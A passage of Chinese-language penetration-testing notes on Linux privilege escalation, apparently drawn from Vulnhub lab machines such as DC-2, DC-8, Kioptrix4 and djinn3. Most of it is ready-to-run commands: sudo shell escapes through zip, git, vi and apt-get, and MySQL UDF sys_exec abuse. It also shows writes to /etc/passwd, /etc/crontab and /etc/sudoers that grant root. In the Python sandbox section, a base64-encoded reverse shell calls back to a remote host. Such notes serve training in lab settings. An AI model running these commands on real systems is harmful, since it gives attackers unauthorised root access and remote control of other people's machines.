可以发现 sarang 用户可以以 root 用户身份权限来运行 zip 命令，那么我们就可以通过 ZIP 来进行提权

**方法一**
```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```
![](./assets/1671608451279-907f74da-ce2e-4bae-a154-4248ee7abc7e.jpeg)

**方法二**<br />先创建一个 liuwx 文件，然后在将它压缩为zip文件，最后使用unzip-command来执行bash命令从而提权：
```
touch liuwx
sudo zip /tmp/liuwx.zip /home/sarang/liuwx -T --unzip-command="sh -c /bin/bash"
```
tmp为可写目录，所以压缩包放在tmp下；<br />![](./assets/1671608451284-0664889c-6785-49fe-9766-4dc2fd3a15df.jpeg)


## 10.5、GIT提权
git命令被分配了root权限<br />![](./assets/1671608748911-8d80aa6b-f4bb-433d-8e87-8620141432b8.jpeg)

**方法一**<br />利用git来提权
```
sudo git help add
!/bin/bash
```
![](./assets/1671608748703-d5002bd4-3fd2-48ce-87d8-d45f07508e56.jpeg)
![](./assets/1671608748680-1bd24304-8c1c-4ae1-af35-ef59602df09b.jpeg)
粘贴代码到此处，然后回车完成提权

**方法二**<br />输入命令`sudo git help config`之后直接在出现的help界面，输入 `!/bin/bash`，成功提权<br />![image-20220110150747962.png](./assets/1652256147381-4ba75de9-1344-46fe-b760-478e97c06b42.png)
![image-20220110150813588.png](./assets/1652256150056-bb1cf5cd-3f00-4a24-b073-75e2c86e5050.png)

实例参考链接：[DC-2](https://www.yuque.com/xmtxsec/network_security/vulnhub-dc-2)


## 10.6、Screen提权
Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。<br />在Screen环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。<br />![](./assets/1671608748751-fc29a490-9b3e-467c-b88b-9e02de6f67f8.jpeg)

将脚本文件转换为linux格式
```
dos2unix 41154.sh
```

传到靶机下，更改权限后运行<br />![](./assets/1652256568936-b35f4e40-17b9-47ff-a693-49efe2bdcadb.png)

实例参考链接：[DC-5](https://www.yuque.com/xmtxsec/network_security/vulnhub-dc-5)


## 10.7、Exim4提权
Exim4是在剑桥大学开发的另一种消息传输代理（MTA），用于在连接到Internet的Unix系统上使用。 尽管exim的配置与sendmail的配置完全不同，但是可以安装Exim代替sendmail。<br />![](./assets/1671608749963-692d060c-4d19-4e11-af9c-b8c712f9600a.jpeg)

查看exim4当前版本号
```
/usr/sbin/exim4 --version
```
![](./assets/1671608750020-3607d179-1203-4686-ba59-982bf6f8ffbf.jpeg)

查找漏洞<br />![](./assets/1671608750132-40ce5a49-6e68-4b71-990f-f3808e7f81ce.jpeg)

上传脚本，执行后成功<br />![](./assets/1671608750721-d575db80-18f3-420b-a2b2-b619dfa319a0.jpeg)

实例参考链接：[DC-8](https://www.yuque.com/xmtxsec/network_security/vulnhub-dc-8)


## 10.8、vi提权
运行sudo -l发现该用户可以任意用户执行vi<br />![](./assets/1671608750824-deb26ba2-b59e-40b1-a461-5737fdbbd684.jpeg)
```
sudo /usr/bin/vi /tmp/jin
```
![](./assets/1671608750860-4a0e824a-2f88-4cc1-8f24-4015b09203e9.jpeg)

esc退出，然后输入
```
 !/bin/bash
```
![](./assets/1671608751168-334c43ef-ecd6-4bae-8aa4-59039c6f726e.jpeg)


## 10.9、Python沙箱逃逸
1337端口用python编写的，于是尝试python沙箱逃逸<br />查看是以什么权限运行
```
eval('__import__("os").system("whoami")') 
```
![](./assets/1671608751583-f725eda5-0c6f-4c48-a38b-401dfd7991cc.jpeg)

反弹shell
```
eval('__import__("os").system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2Ny4xMzEvNjY2NiAwPiYx|base64 -d|bash")') 
```
![](./assets/1671608751732-91a06e5f-29e5-431c-8f62-51e3afc024a8.jpeg)


## 10.10、Mysql UDF提权
查看开启的端口发现有3306<br />![](./assets/1671608752326-4c85aeb3-acdf-4df5-81ec-8cd4389774cb.jpeg)

```
ps -ef | grep root | grep mysql
```
![](./assets/1671608752336-5b061fd8-213f-4fd3-84d3-27b9b1904261.jpeg)

在查看mysql数据库时很幸运发现已经存在func表，且表中含有执行命令的函数，
```
mysql> use mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed 
mysql> select * from func; 
+-----------------------+-----+---------------------+----------+
|name                   | ret | dl                  | type     |
+-----------------------+-----+---------------------+----------+
| lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function |
| sys_exec              |   0 | lib_mysqludf_sys.so | function |
+-----------------------+-----+---------------------+----------+
2 rows in set (0.00 sec)

mysql> select sys_exec('usermod -a -G admin john');
+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 |
+--------------------------------------+
1 row in set (0.05 sec) 

mysql> exit
Bye

john@Kioptrix4:/var/www$ sudo su - 
[sudo] password for john: 
root@Kioptrix4:~# whoami 
root 
root@Kioptrix4:~# cd /root 
root@Kioptrix4:~# ls 
congrats.txt  lshell-0.9.12 
root@Kioptrix4:~#
```

UDF提权详情：[0X04 数据库内置函数研究](https://www.yuque.com/xmtxsec/network_security/anq3ng)
UDF提权实例：[pWnOS: 2.0](https://www.yuque.com/xmtxsec/network_security/ftamoe)


## 10.11、apt-get提权
执行sudo -l，发现可以免密执行adduser命令，添加一个root组的用户<br />![](./assets/1671608752522-dbf058b6-d0b7-487a-baf3-c37aa0088426.jpeg)

有了这个跟 root 同一组的用户，就可以读到一些只能root组和root读的文件:/etc/sudoers，该文件包含了能够让普通用户执行一些或者全部的root命令，如果该文件可以写入的话，我们可以把当前用户写入：chounana ALL=(ALL:ALL) ALL，这样当执行sudo su的时候，我们就可以进入到 root 了！

查看sudoers文件，查看还有哪些用户可以使用sudo执行命令，发现一个jason用户，但是这个用户并不存在，但是我们是可以新建用户的，所以需要密码（自己的密码）才能执行这个也就没有问题。<br />![](./assets/1671608752604-bad06e70-5866-4320-9265-612156958eb7.jpeg)
exit退回到saint用户，新建jason用户
```
chounana@djinn3:/home/saint$ exit
exit
saint@djinn3:~$ sudo adduser jason
Adding user `jason' ...
Adding new group `jason' (1005) ...
Adding new user `jason' (1005) with group `jason' ...
Creating home directory `/home/jason' ...
Copying files from `/etc/skel' ...
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
Changing the user information for jason
Enter the new value, or press ENTER for the default
        Full Name []: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
Is the information correct? [Y/n] 
saint@djinn3:~$ 
```

切换到jason用户，使用apt-get命令提权，因为用户是自己建立的，所以密码也当然是知道的；
```
sudo apt-get changelog apt
!/bin/bash
```
![](./assets/1671608752680-ebbc2635-1113-4445-abe6-7afaf0de707e.jpeg)


## 10.12、tee提权
这里靶机用的是teehee命令，可以写入文件内容并不覆盖文件原有内容，功能与tee命令类似。<br />![](./assets/1671608752949-d564ecca-0ee7-47cf-a03a-c521a975b69f.jpeg)
虽然有密码，但不能直接切到root，从sudo看，明显这个teehee可以不要密码以root身份运行，提权就靠这个程序了；

**方法一**<br />追加一个名为hacker的用户，将它的uid和gid也设置为root的0：
```
echo "hacker::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```
![](./assets/1671608753090-dfee96e0-efe2-4e77-927f-52b4f6ab774e.jpeg)
![](./assets/1671608753698-6f991993-0f92-4c3e-bb7b-d6612566c080.jpeg)


**方法二**<br />可以在/etc/crontab下写入定时计划，提升到root权限。<br />crontab介绍<br />Linux crontab是用来定期执行程序的命令。当安装完成操作系统之后，默认便会启动此任务调度命令。
```
f1 f2 f3 f4 f5 program
其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。
当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序，其馀类推；
当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行，其馀类推；
当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次，其馀类推；
当 f1 为 a, b, c,... 时表示第 a, b, c,... 分钟要执行，f2 为 a, b, c,... 时表示第 a, b, c...个小时要执行，其馀类推

*    *    *    *    *
-    -    -    -    -
|    |    |    |    |
|    |    |    |    +----- 星期中星期几 (0 - 7) (星期天 为0)
|    |    |    +---------- 月份 (1 - 12) 
|    |    +--------------- 一个月中的第几天 (1 - 31)
|    +-------------------- 小时 (0 - 23)
+------------------------- 分钟 (0 - 59)
```

我们可以追加内容为
```
echo "* * * * * root chmod 4777 /bin/sh" | sudo teehee -a /etc/crontab
```
表示在/etc/crontab下写入定时计划，一分钟后由root用户给 /bin/bash 命令加权限（chmod 4777即开启suid和rwx权限）<br />![](./assets/1671608753729-75c9f6d3-963f-4921-b279-dc79228471ca.jpeg)

**方法三**<br />先看看本地sudoers文件的语法。
```
cat sudoers
```
![](./assets/1671608753856-822d733c-f1cb-435b-a0e4-61fa4fc081f9.jpeg)
仿造写一个 charles ALL=(ALL:ALL) ALL
```
echo "charles ALL=(ALL:ALL) ALL" | sudo teehee -a /etc/sudoers
```
![](./assets/1671608753874-256f58d7-0b60-436f-8d8e-61f1aa1f1e2b.jpeg)

可以看到现在charles可以以root用户身份运行所有命令<br />![](./assets/1671608753891-3546d717-0a58-4303-a16c-643981698c42.jpeg)










